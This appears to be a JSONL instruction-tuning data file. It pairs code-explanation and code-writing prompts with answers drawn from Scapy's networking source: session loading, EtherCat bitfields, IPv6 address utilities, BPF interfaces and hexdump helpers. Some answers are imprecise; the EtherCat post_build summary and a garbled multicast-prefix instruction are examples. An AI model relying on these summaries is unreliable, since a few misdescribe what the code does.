{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef load_session(fname=None):\n    if fname is None:\n        fname = conf.session\n    try:\n        s = six.moves.cPickle.load(gzip.open(fname, \"rb\"))\n    except IOError:\n        try:\n            s = six.moves.cPickle.load(open(fname, \"rb\"))\n        except IOError:\n            # Raise \"No such file exception\"\n            raise\n\n    scapy_session = six.moves.builtins.__dict__[\"scapy_session\"]\n    scapy_session.clear()\n    scapy_session.update(s)\n    update_ipython_session(scapy_session)\n\n    log_loading.info(\"Loaded session [%s]\" % fname)", "response": "Load current Scapy session from the file specified in the fname arg."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update_session(fname=None):\n    if fname is None:\n        fname = conf.session\n    try:\n        s = six.moves.cPickle.load(gzip.open(fname, \"rb\"))\n    except IOError:\n        s = six.moves.cPickle.load(open(fname, \"rb\"))\n    scapy_session = six.moves.builtins.__dict__[\"scapy_session\"]\n    scapy_session.update(s)\n    update_ipython_session(scapy_session)", "response": "Update the current Scapy session from the file specified in the fname arg."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating an interactive session and execute the passed commands and return all output", "response": "def autorun_get_interactive_session(cmds, **kargs):\n    \"\"\"Create an interactive session and execute the\n    commands passed as \"cmds\" and return all output\n\n    params:\n      - cmds: a list of commands to run\n    returns: (output, returned)\n\n    The output contains both sys.stdout and sys.stderr logs\"\"\"\n    sstdout, sstderr = sys.stdout, sys.stderr\n    sw = StringWriter()\n    try:\n        try:\n            sys.stdout = sys.stderr = sw\n            res = autorun_commands(cmds, **kargs)\n        except StopAutorun as e:\n            e.code_run = sw.s\n            raise\n    finally:\n        sys.stdout, sys.stderr = sstdout, sstderr\n    return sw.s, res"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _check_field_type(self, pkt, index):\n        my_idx = pkt.fields_desc.index(self)\n        try:\n            next_field = pkt.fields_desc[my_idx + index]\n            if type(next_field) is not LEBitField and \\\n               next_field.__class__.__base__ is not LEBitField:\n                raise LEBitFieldSequenceException('field after field {} must '\n                                                  'be of type LEBitField or '\n                                                  'derived classes'.format(self.name))  # noqa: E501\n        except IndexError:\n            # no more fields -> error\n            raise LEBitFieldSequenceException('Missing further LEBitField '\n                                              'based fields after field '\n                                              '{} '.format(self.name))", "response": "check if the field addressed by given index is of type LEBitField or bitField"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nextracts data from raw string and returns the bit field value and the bits_in_set of the bitfield.", "response": "def getfield(self, pkt, s):\n\n        \"\"\"\n        extract data from raw str\n\n        collect all instances belonging to the bit field set.\n        if we reach a field that ends at a octet boundary, dissect the whole bit field at once  # noqa: E501\n\n        :param pkt: packet instance the field belongs to\n        :param s: raw string representing the frame -or- tuple containing raw str, number of bits and array of fields  # noqa: E501\n        :return: tuple containing raw str, number of bits and array of fields -or- remaining raw str and value of this  # noqa: E501\n        \"\"\"\n\n        if type(s) is tuple and len(s) == 3:\n            s, bits_in_set, fields = s\n        else:\n            bits_in_set = 0\n            fields = []\n\n        bits_in_set += self.size\n\n        fields.append(self)\n\n        if bits_in_set % 8:\n            # we are in between the bitfield\n            return (s, bits_in_set, fields), None\n\n        else:\n            cur_val = 0\n            cur_val_bit_idx = 0\n            this_val = 0\n\n            field_idx = 0\n            field = fields[field_idx]\n            field_required_bits = field.size\n            idx = 0\n\n            s = bytearray(s)\n            bf_total_byte_length = bits_in_set // 8\n\n            for octet in s[0:bf_total_byte_length]:\n                idx += 1\n\n                octet_bits_left = 8\n\n                while octet_bits_left:\n\n                    if field_required_bits == octet_bits_left:\n                        # whole field fits into remaining bits\n                        # as this also signals byte-alignment this should exit the inner and outer loop  # noqa: E501\n                        cur_val |= octet << cur_val_bit_idx\n                        pkt.fields[field.name] = cur_val\n\n                        '''\n                        TODO: check if do_dessect() needs a non-None check for assignment to raw_packet_cache_fields  # noqa: E501\n\n                        setfieldval() is evil as it sets raw_packet_cache_fields to None - but this attribute  # noqa: E501\n                        is accessed in do_dissect() without checking for None... exception is caught and the  # noqa: E501\n                        user ends up with a layer decoded as raw...\n\n                        pkt.setfieldval(field.name, int(bit_str[:field.size], 2))  # noqa: E501\n                        '''\n\n                        octet_bits_left = 0\n\n                        this_val = cur_val\n\n                    elif field_required_bits < octet_bits_left:\n                        # pick required bits\n                        cur_val |= (octet & ((2 ** field_required_bits) - 1)) << cur_val_bit_idx  # noqa: E501\n                        pkt.fields[field.name] = cur_val\n\n                        # remove consumed bits\n                        octet >>= field_required_bits\n                        octet_bits_left -= field_required_bits\n\n                        # and move to the next field\n                        field_idx += 1\n                        field = fields[field_idx]\n                        field_required_bits = field.size\n                        cur_val_bit_idx = 0\n                        cur_val = 0\n\n                    elif field_required_bits > octet_bits_left:\n                        # take remaining bits\n                        cur_val |= octet << cur_val_bit_idx\n\n                        cur_val_bit_idx += octet_bits_left\n                        field_required_bits -= octet_bits_left\n                        octet_bits_left = 0\n\n            return s[bf_total_byte_length:], this_val"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef post_build(self, pkt, pay):\n\n        class _EtherCatLengthCalc(Packet):\n            \"\"\"\n            dummy class used to generate str representation easily\n            \"\"\"\n            fields_desc = [\n                LEBitField('length', None, 11),\n                LEBitField('_reserved', 0, 1),\n                LEBitField('type', 0, 4),\n            ]\n\n        payload_len = len(pay)\n\n        # length field is 11 bit\n        if payload_len > 2047:\n            raise ValueError('payload size {} exceeds maximum length {} '\n                             'of EtherCat message.'.format(payload_len, 2047))\n\n        self.length = payload_len\n\n        vlan_headers_total_size = 0\n        upper_layer = self.underlayer\n\n        # add size occupied by VLAN tags\n        while upper_layer and isinstance(upper_layer, Dot1Q):\n            vlan_headers_total_size += 4\n            upper_layer = upper_layer.underlayer\n\n        if not isinstance(upper_layer, Ether):\n            raise Exception('missing Ether layer')\n\n        pad_len = EtherCat.ETHER_FRAME_MIN_LEN - (EtherCat.ETHER_HEADER_LEN +\n                                                  vlan_headers_total_size +\n                                                  EtherCat.ETHERCAT_HEADER_LEN +  # noqa: E501\n                                                  payload_len +\n                                                  EtherCat.ETHER_FSC_LEN)\n\n        if pad_len > 0:\n            pad = Padding()\n            pad.load = b'\\x00' * pad_len\n\n            return raw(_EtherCatLengthCalc(length=self.length,\n                                           type=self.type)) + pay + raw(pad)\n        return raw(_EtherCatLengthCalc(length=self.length,\n                                       type=self.type)) + pay", "response": "This method is called when the packet is sent to the EtherCat."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncompute the interface ID in modified EUI - 64 format associated to the given MAC address.", "response": "def in6_mactoifaceid(mac, ulbit=None):\n    \"\"\"\n    Compute the interface ID in modified EUI-64 format associated\n    to the Ethernet address provided as input.\n    value taken by U/L bit in the interface identifier is basically\n    the reversed value of that in given MAC address it can be forced\n    to a specific value by using optional 'ulbit' parameter.\n    \"\"\"\n    if len(mac) != 17:\n        return None\n    m = \"\".join(mac.split(':'))\n    if len(m) != 12:\n        return None\n    first = int(m[0:2], 16)\n    if ulbit is None or not (ulbit == 0 or ulbit == 1):\n        ulbit = [1, '-', 0][first & 0x02]\n    ulbit *= 2\n    first = \"%.02x\" % ((first & 0xFD) | ulbit)\n    eui64 = first + m[2:4] + \":\" + m[4:6] + \"FF:FE\" + m[6:8] + \":\" + m[8:12]\n    return eui64.upper()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nextracting the MAC address from a given iface ID.", "response": "def in6_ifaceidtomac(ifaceid):\n    \"\"\"\n    Extract the mac address from provided iface ID. Iface ID is provided\n    in printable format (\"XXXX:XXFF:FEXX:XXXX\", eventually compressed). None\n    is returned on error.\n    \"\"\"\n    try:\n        # Set ifaceid to a binary form\n        ifaceid = inet_pton(socket.AF_INET6, \"::\" + ifaceid)[8:16]\n    except Exception:\n        return None\n    if ifaceid[3:5] != b'\\xff\\xfe':  # Check for burned-in MAC address\n        return None\n\n    # Unpacking and converting first byte of faceid to MAC address equivalent\n    first = struct.unpack(\"B\", ifaceid[:1])[0]\n    ulbit = 2 * [1, '-', 0][first & 0x02]\n    first = struct.pack(\"B\", ((first & 0xFD) | ulbit))\n    # Split into two vars to remove the \\xff\\xfe bytes\n    oui = first + ifaceid[1:3]\n    end = ifaceid[5:]\n    # Convert and reconstruct into a MAC Address\n    mac_bytes = [\"%.02x\" % orb(x) for x in list(oui + end)]\n    return \":\".join(mac_bytes)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef in6_addrtomac(addr):\n    mask = inet_pton(socket.AF_INET6, \"::ffff:ffff:ffff:ffff\")\n    x = in6_and(mask, inet_pton(socket.AF_INET6, addr))\n    ifaceid = inet_ntop(socket.AF_INET6, x)[2:]\n    return in6_ifaceidtomac(ifaceid)", "response": "Extract the mac address from provided address."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef in6_addrtovendor(addr):\n    mac = in6_addrtomac(addr)\n    if mac is None or conf.manufdb is None:\n        return None\n\n    res = conf.manufdb._get_manuf(mac)\n    if len(res) == 17 and res.count(':') != 5:  # Mac address, i.e. unknown\n        res = \"UNKNOWN\"\n\n    return res", "response": "Convert an IPv6 address to the vendor name."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef in6_getLinkScopedMcastAddr(addr, grpid=None, scope=2):\n    if scope not in [0, 1, 2]:\n        return None\n    try:\n        if not in6_islladdr(addr):\n            return None\n        addr = inet_pton(socket.AF_INET6, addr)\n    except Exception:\n        warning(\"in6_getLinkScopedMcastPrefix(): Invalid address provided\")\n        return None\n\n    iid = addr[8:]\n\n    if grpid is None:\n        grpid = b'\\x00\\x00\\x00\\x00'\n    else:\n        if isinstance(grpid, (bytes, str)):\n            if len(grpid) == 8:\n                try:\n                    grpid = int(grpid, 16) & 0xffffffff\n                except Exception:\n                    warning(\"in6_getLinkScopedMcastPrefix(): Invalid group id provided\")  # noqa: E501\n                    return None\n            elif len(grpid) == 4:\n                try:\n                    grpid = struct.unpack(\"!I\", grpid)[0]\n                except Exception:\n                    warning(\"in6_getLinkScopedMcastPrefix(): Invalid group id provided\")  # noqa: E501\n                    return None\n        grpid = struct.pack(\"!I\", grpid)\n\n    flgscope = struct.pack(\"B\", 0xff & ((0x3 << 4) | scope))\n    plen = b'\\xff'\n    res = b'\\x00'\n    a = b'\\xff' + flgscope + res + plen + iid + grpid\n\n    return inet_ntop(socket.AF_INET6, a)", "response": "Generate a Link - Scoped Multicast Address as described in RFC 4489."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef in6_getLocalUniquePrefix():\n    # Extracted from RFC 1305 (NTP) :\n    # NTP timestamps are represented as a 64-bit unsigned fixed-point number,\n    # in seconds relative to 0h on 1 January 1900. The integer part is in the\n    # first 32 bits and the fraction part in the last 32 bits.\n\n    # epoch = (1900, 1, 1, 0, 0, 0, 5, 1, 0)\n    # x = time.time()\n    # from time import gmtime, strftime, gmtime, mktime\n    # delta = mktime(gmtime(0)) - mktime(self.epoch)\n    # x = x-delta\n\n    tod = time.time()  # time of day. Will bother with epoch later\n    i = int(tod)\n    j = int((tod - i) * (2**32))\n    tod = struct.pack(\"!II\", i, j)\n    mac = RandMAC()\n    # construct modified EUI-64 ID\n    eui64 = inet_pton(socket.AF_INET6, '::' + in6_mactoifaceid(mac))[8:]\n    import hashlib\n    globalid = hashlib.sha1(tod + eui64).digest()[:5]\n    return inet_ntop(socket.AF_INET6, b'\\xfd' + globalid + b'\\x00' * 10)", "response": "Returns a pseudo - randomly generated Local Unique prefix."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef in6_getRandomizedIfaceId(ifaceid, previous=None):\n\n    s = b\"\"\n    if previous is None:\n        d = b\"\".join(chb(x) for x in range(256))\n        for _ in range(8):\n            s += chb(random.choice(d))\n        previous = s\n    s = inet_pton(socket.AF_INET6, \"::\" + ifaceid)[8:] + previous\n    import hashlib\n    s = hashlib.md5(s).digest()\n    s1, s2 = s[:8], s[8:]\n    s1 = chb(orb(s1[0]) | 0x04) + s1[1:]\n    s1 = inet_ntop(socket.AF_INET6, b\"\\xff\" * 8 + s1)[20:]\n    s2 = inet_ntop(socket.AF_INET6, b\"\\xff\" * 8 + s2)[20:]\n    return (s1, s2)", "response": "This function generates a randomized interface identifier for the specified interface ID."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts an IPv6 address in printable representation to RFC 1924 Compact Representation ; - )", "response": "def in6_ptoc(addr):\n    \"\"\"\n    Converts an IPv6 address in printable representation to RFC\n    1924 Compact Representation ;-)\n    Returns None on error.\n    \"\"\"\n    try:\n        d = struct.unpack(\"!IIII\", inet_pton(socket.AF_INET6, addr))\n    except Exception:\n        return None\n    res = 0\n    m = [2**96, 2**64, 2**32, 1]\n    for i in range(4):\n        res += d[i] * m[i]\n    rem = res\n    res = []\n    while rem:\n        res.append(_rfc1924map[rem % 85])\n        rem = rem // 85\n    res.reverse()\n    return \"\".join(res)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef in6_isaddrTeredo(x):\n    our = inet_pton(socket.AF_INET6, x)[0:4]\n    teredoPrefix = inet_pton(socket.AF_INET6, conf.teredoPrefix)[0:4]\n    return teredoPrefix == our", "response": "Returns True if provided address is a Teredo."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef teredoAddrExtractInfo(x):\n    addr = inet_pton(socket.AF_INET6, x)\n    server = inet_ntop(socket.AF_INET, addr[4:8])\n    flag = struct.unpack(\"!H\", addr[8:10])[0]\n    mappedport = struct.unpack(\"!H\", strxor(addr[10:12], b'\\xff' * 2))[0]\n    mappedaddr = inet_ntop(socket.AF_INET, strxor(addr[12:16], b'\\xff' * 4))\n    return server, flag, mappedaddr, mappedport", "response": "Extract information from a Teredo address."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef in6_iseui64(x):\n    eui64 = inet_pton(socket.AF_INET6, '::ff:fe00:0')\n    x = in6_and(inet_pton(socket.AF_INET6, x), eui64)\n    return x == eui64", "response": "Returns True if provided address has an interface identifier part\n    created in modified EUI - 64 format."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef in6_getnsma(a):\n\n    r = in6_and(a, inet_pton(socket.AF_INET6, '::ff:ffff'))\n    r = in6_or(inet_pton(socket.AF_INET6, 'ff02::1:ff00:0'), r)\n    return r", "response": "Returns a network format multicast address for given address."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef in6_getha(prefix):\n    r = in6_and(inet_pton(socket.AF_INET6, prefix), in6_cidr2mask(64))\n    r = in6_or(r, inet_pton(socket.AF_INET6, '::fdff:ffff:ffff:fffe'))\n    return inet_ntop(socket.AF_INET6, r)", "response": "Returns the anycast address associated with all home agents on a given subnet."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef in6_isincluded(addr, prefix, plen):\n    temp = inet_pton(socket.AF_INET6, addr)\n    pref = in6_cidr2mask(plen)\n    zero = inet_pton(socket.AF_INET6, prefix)\n    return zero == in6_and(temp, pref)", "response": "Returns True when addr belongs to prefix and plen."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns True if provided address is a link - local solicited node multicast address i. e. belongs to ff00 : 0 / 104. False is returned otherwise.", "response": "def in6_isllsnmaddr(str):\n    \"\"\"\n    Return True if provided address is a link-local solicited node\n    multicast address, i.e. belongs to ff02::1:ff00:0/104. False is\n    returned otherwise.\n    \"\"\"\n    temp = in6_and(b\"\\xff\" * 13 + b\"\\x00\" * 3, inet_pton(socket.AF_INET6, str))\n    temp2 = b'\\xff\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xff\\x00\\x00\\x00'\n    return temp == temp2"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef in6_getscope(addr):\n    if in6_isgladdr(addr) or in6_isuladdr(addr):\n        scope = IPV6_ADDR_GLOBAL\n    elif in6_islladdr(addr):\n        scope = IPV6_ADDR_LINKLOCAL\n    elif in6_issladdr(addr):\n        scope = IPV6_ADDR_SITELOCAL\n    elif in6_ismaddr(addr):\n        if in6_ismgladdr(addr):\n            scope = IPV6_ADDR_GLOBAL\n        elif in6_ismlladdr(addr):\n            scope = IPV6_ADDR_LINKLOCAL\n        elif in6_ismsladdr(addr):\n            scope = IPV6_ADDR_SITELOCAL\n        elif in6_ismnladdr(addr):\n            scope = IPV6_ADDR_LOOPBACK\n        else:\n            scope = -1\n    elif addr == '::1':\n        scope = IPV6_ADDR_LOOPBACK\n    else:\n        scope = -1\n    return scope", "response": "Returns the scope of the address."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef in6_get_common_plen(a, b):\n    def matching_bits(byte1, byte2):\n        for i in range(8):\n            cur_mask = 0x80 >> i\n            if (byte1 & cur_mask) != (byte2 & cur_mask):\n                return i\n        return 8\n\n    tmpA = inet_pton(socket.AF_INET6, a)\n    tmpB = inet_pton(socket.AF_INET6, b)\n    for i in range(16):\n        mbits = matching_bits(orb(tmpA[i]), orb(tmpB[i]))\n        if mbits != 8:\n            return 8 * i + mbits\n    return 128", "response": "Return the common prefix length of IPv6 addresses a and b."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef in6_isvalid(address):\n\n    try:\n        socket.inet_pton(socket.AF_INET6, address)\n        return True\n    except Exception:\n        return False", "response": "Return True if the given string is a valid IPv6 address string False otherwise."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the IPv4 address configured on ifname packed with inet_pton.", "response": "def get_if_raw_addr(ifname):\n    \"\"\"Returns the IPv4 address configured on 'ifname', packed with inet_pton.\"\"\"  # noqa: E501\n\n    # Get ifconfig output\n    try:\n        fd = os.popen(\"%s %s\" % (conf.prog.ifconfig, ifname))\n    except OSError as msg:\n        warning(\"Failed to execute ifconfig: (%s)\", msg)\n        return b\"\\0\\0\\0\\0\"\n\n    # Get IPv4 addresses\n    addresses = [l for l in fd if l.find(\"inet \") >= 0]\n    if not addresses:\n        warning(\"No IPv4 address found on %s !\", ifname)\n        return b\"\\0\\0\\0\\0\"\n\n    # Pack the first address\n    address = addresses[0].split(' ')[1]\n    if '/' in address:  # NetBSD 8.0\n        address = address.split(\"/\")[0]\n    return socket.inet_pton(socket.AF_INET, address)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the packed MAC address configured on ifname.", "response": "def get_if_raw_hwaddr(ifname):\n    \"\"\"Returns the packed MAC address configured on 'ifname'.\"\"\"\n\n    NULL_MAC_ADDRESS = b'\\x00' * 6\n\n    # Handle the loopback interface separately\n    if ifname == LOOPBACK_NAME:\n        return (ARPHDR_LOOPBACK, NULL_MAC_ADDRESS)\n\n    # Get ifconfig output\n    try:\n        fd = os.popen(\"%s %s\" % (conf.prog.ifconfig, ifname))\n    except OSError as msg:\n        raise Scapy_Exception(\"Failed to execute ifconfig: (%s)\" % msg)\n\n    # Get MAC addresses\n    addresses = [l for l in fd.readlines() if l.find(\"ether\") >= 0 or\n                 l.find(\"lladdr\") >= 0 or\n                 l.find(\"address\") >= 0]\n    if not addresses:\n        raise Scapy_Exception(\"No MAC address found on %s !\" % ifname)\n\n    # Pack and return the MAC address\n    mac = addresses[0].split(' ')[1]\n    mac = [chr(int(b, 16)) for b in mac.split(':')]\n    return (ARPHDR_ETHER, ''.join(mac))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_dev_bpf():\n\n    # Get the first available BPF handle\n    for bpf in range(256):\n        try:\n            fd = os.open(\"/dev/bpf%i\" % bpf, os.O_RDWR)\n            return (fd, bpf)\n        except OSError:\n            continue\n\n    raise Scapy_Exception(\"No /dev/bpf handle is available !\")", "response": "Returns an opened BPF file object"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef attach_filter(fd, bpf_filter, iface):\n    bp = compile_filter(bpf_filter, iface)\n    # Assign the BPF program to the interface\n    ret = LIBC.ioctl(c_int(fd), BIOCSETF, cast(pointer(bp), c_char_p))\n    if ret < 0:\n        raise Scapy_Exception(\"Can't attach the BPF filter !\")", "response": "Attach a BPF filter to the BPF file descriptor"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a list containing all network interfaces.", "response": "def get_if_list():\n    \"\"\"Returns a list containing all network interfaces.\"\"\"\n\n    # Get ifconfig output\n    try:\n        fd = os.popen(\"%s -a\" % conf.prog.ifconfig)\n    except OSError as msg:\n        raise Scapy_Exception(\"Failed to execute ifconfig: (%s)\" % msg)\n\n    # Get interfaces\n    interfaces = [line[:line.find(':')] for line in fd.readlines()\n                  if \": flags\" in line.lower()]\n    return interfaces"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_working_ifaces():\n\n    # Only root is allowed to perform the following ioctl() call\n    if os.getuid() != 0:\n        return []\n\n    # Test all network interfaces\n    interfaces = []\n    for ifname in get_if_list():\n\n        # Unlike pcap_findalldevs(), we do not care of loopback interfaces.\n        if ifname == LOOPBACK_NAME:\n            continue\n\n        # Get interface flags\n        try:\n            result = get_if(ifname, SIOCGIFFLAGS)\n        except IOError:\n            warning(\"ioctl(SIOCGIFFLAGS) failed on %s !\", ifname)\n            continue\n\n        # Convert flags\n        ifflags = struct.unpack(\"16xH14x\", result)[0]\n        if ifflags & 0x1:  # IFF_UP\n\n            # Get a BPF handle\n            fd = get_dev_bpf()[0]\n            if fd is None:\n                raise Scapy_Exception(\"No /dev/bpf are available !\")\n\n            # Check if the interface can be used\n            try:\n                fcntl.ioctl(fd, BIOCSETIF, struct.pack(\"16s16x\",\n                                                       ifname.encode()))\n            except IOError:\n                pass\n            else:\n                ifnum, ifab = _IFNUM.search(ifname).groups()\n                interfaces.append((ifname, int(ifnum) if ifnum else -1, ifab))\n            finally:\n                # Close the file descriptor\n                os.close(fd)\n\n    # Sort to mimic pcap_findalldevs() order\n    interfaces.sort(key=lambda elt: (elt[1], elt[2], elt[0]))\n\n    return [iface[0] for iface in interfaces]", "response": "Returns an ordered list of interfaces that could be used with BPF."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a temporary file and returns its path.", "response": "def get_temp_file(keep=False, autoext=\"\", fd=False):\n    \"\"\"Creates a temporary file.\n\n    :param keep: If False, automatically delete the file when Scapy exits.\n    :param autoext: Suffix to add to the generated file name.\n    :param fd: If True, this returns a file-like object with the temporary\n               file opened. If False (default), this returns a file path.\n    \"\"\"\n    f = tempfile.NamedTemporaryFile(prefix=\"scapy\", suffix=autoext,\n                                    delete=False)\n    if not keep:\n        conf.temp_files.append(f.name)\n\n    if fd:\n        return f\n    else:\n        # Close the file so something else can take it.\n        f.close()\n        return f.name"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a temporary file and returns its name.", "response": "def get_temp_dir(keep=False):\n    \"\"\"Creates a temporary file, and returns its name.\n\n    :param keep: If False (default), the directory will be recursively\n                 deleted when Scapy exits.\n    :return: A full path to a temporary directory.\n    \"\"\"\n\n    dname = tempfile.mkdtemp(prefix=\"scapy\")\n\n    if not keep:\n        conf.temp_files.append(dname)\n\n    return dname"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nbuilding a tcpdump like hexadecimal view of a Packet", "response": "def hexdump(x, dump=False):\n    \"\"\"Build a tcpdump like hexadecimal view\n\n    :param x: a Packet\n    :param dump: define if the result must be printed or returned in a variable\n    :returns: a String only when dump=True\n    \"\"\"\n    s = \"\"\n    x = bytes_encode(x)\n    x_len = len(x)\n    i = 0\n    while i < x_len:\n        s += \"%04x  \" % i\n        for j in range(16):\n            if i + j < x_len:\n                s += \"%02X \" % orb(x[i + j])\n            else:\n                s += \"   \"\n        s += \" %s\\n\" % sane_color(x[i:i + 16])\n        i += 16\n    # remove trailing \\n\n    s = s[:-1] if s.endswith(\"\\n\") else s\n    if dump:\n        return s\n    else:\n        print(s)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nbuilds an equivalent view of hexdump() on a single line Note that setting both onlyasc and onlyhex to 1 results in a empty output :param x: a Packet :param onlyasc: 1 to display only the ascii view :param onlyhex: 1 to display only the hexadecimal view :param dump: print the view if False :returns: a String only when dump=True", "response": "def linehexdump(x, onlyasc=0, onlyhex=0, dump=False):\n    \"\"\"Build an equivalent view of hexdump() on a single line\n\n    Note that setting both onlyasc and onlyhex to 1 results in a empty output\n\n    :param x: a Packet\n    :param onlyasc: 1 to display only the ascii view\n    :param onlyhex: 1 to display only the hexadecimal view\n    :param dump: print the view if False\n    :returns: a String only when dump=True\n    \"\"\"\n    s = \"\"\n    s = hexstr(x, onlyasc=onlyasc, onlyhex=onlyhex, color=not dump)\n    if dump:\n        return s\n    else:\n        print(s)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding a per byte hexadecimal representation of a packet.", "response": "def chexdump(x, dump=False):\n    \"\"\"Build a per byte hexadecimal representation\n\n    Example:\n        >>> chexdump(IP())\n        0x45, 0x00, 0x00, 0x14, 0x00, 0x01, 0x00, 0x00, 0x40, 0x00, 0x7c, 0xe7, 0x7f, 0x00, 0x00, 0x01, 0x7f, 0x00, 0x00, 0x01  # noqa: E501\n\n    :param x: a Packet\n    :param dump: print the view if False\n    :returns: a String only if dump=True\n    \"\"\"\n    x = bytes_encode(x)\n    s = \", \".join(\"%#04x\" % orb(x) for x in x)\n    if dump:\n        return s\n    else:\n        print(s)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds a fancy tcpdump like hex from bytes.", "response": "def hexstr(x, onlyasc=0, onlyhex=0, color=False):\n    \"\"\"Build a fancy tcpdump like hex from bytes.\"\"\"\n    x = bytes_encode(x)\n    _sane_func = sane_color if color else sane\n    s = []\n    if not onlyasc:\n        s.append(\" \".join(\"%02X\" % orb(b) for b in x))\n    if not onlyhex:\n        s.append(_sane_func(x))\n    return \"  \".join(s)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nshow differences between two binary strings", "response": "def hexdiff(x, y):\n    \"\"\"Show differences between 2 binary strings\"\"\"\n    x = bytes_encode(x)[::-1]\n    y = bytes_encode(y)[::-1]\n    SUBST = 1\n    INSERT = 1\n    d = {(-1, -1): (0, (-1, -1))}\n    for j in range(len(y)):\n        d[-1, j] = d[-1, j - 1][0] + INSERT, (-1, j - 1)\n    for i in range(len(x)):\n        d[i, -1] = d[i - 1, -1][0] + INSERT, (i - 1, -1)\n\n    for j in range(len(y)):\n        for i in range(len(x)):\n            d[i, j] = min((d[i - 1, j - 1][0] + SUBST * (x[i] != y[j]), (i - 1, j - 1)),  # noqa: E501\n                          (d[i - 1, j][0] + INSERT, (i - 1, j)),\n                          (d[i, j - 1][0] + INSERT, (i, j - 1)))\n\n    backtrackx = []\n    backtracky = []\n    i = len(x) - 1\n    j = len(y) - 1\n    while not (i == j == -1):\n        i2, j2 = d[i, j][1]\n        backtrackx.append(x[i2 + 1:i + 1])\n        backtracky.append(y[j2 + 1:j + 1])\n        i, j = i2, j2\n\n    x = y = i = 0\n    colorize = {0: lambda x: x,\n                -1: conf.color_theme.left,\n                1: conf.color_theme.right}\n\n    dox = 1\n    doy = 0\n    btx_len = len(backtrackx)\n    while i < btx_len:\n        linex = backtrackx[i:i + 16]\n        liney = backtracky[i:i + 16]\n        xx = sum(len(k) for k in linex)\n        yy = sum(len(k) for k in liney)\n        if dox and not xx:\n            dox = 0\n            doy = 1\n        if dox and linex == liney:\n            doy = 1\n\n        if dox:\n            xd = y\n            j = 0\n            while not linex[j]:\n                j += 1\n                xd -= 1\n            print(colorize[doy - dox](\"%04x\" % xd), end=' ')\n            x += xx\n            line = linex\n        else:\n            print(\"    \", end=' ')\n        if doy:\n            yd = y\n            j = 0\n            while not liney[j]:\n                j += 1\n                yd -= 1\n            print(colorize[doy - dox](\"%04x\" % yd), end=' ')\n            y += yy\n            line = liney\n        else:\n            print(\"    \", end=' ')\n\n        print(\" \", end=' ')\n\n        cl = \"\"\n        for j in range(16):\n            if i + j < btx_len:\n                if line[j]:\n                    col = colorize[(linex[j] != liney[j]) * (doy - dox)]\n                    print(col(\"%02X\" % orb(line[j])), end=' ')\n                    if linex[j] == liney[j]:\n                        cl += sane_color(line[j])\n                    else:\n                        cl += col(sane(line[j]))\n                else:\n                    print(\"  \", end=' ')\n                    cl += \" \"\n            else:\n                print(\"  \", end=' ')\n            if j == 7:\n                print(\"\", end=' ')\n\n        print(\" \", cl)\n\n        if doy or not yy:\n            doy = 0\n            dox = 1\n            i += 16\n        else:\n            if yy:\n                dox = 0\n                doy = 1\n            else:\n                i += 16"}
